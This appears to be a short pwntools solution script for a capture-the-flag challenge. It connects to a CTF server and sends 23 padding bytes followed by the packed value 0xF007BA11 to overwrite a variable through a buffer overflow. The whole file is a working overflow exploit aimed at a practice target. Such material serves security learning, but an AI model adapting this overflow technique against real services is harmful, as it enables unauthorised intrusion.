#!/usr/bin/python
from pwn import *

r = remote('pwn.ctf.tamu.edu', 4321)
r.recvuntil('What is my secret?')

varc = 0xF007BA11
payload = 'A'*23+p32(varc)

r.sendline(payload)
print r.recvall()
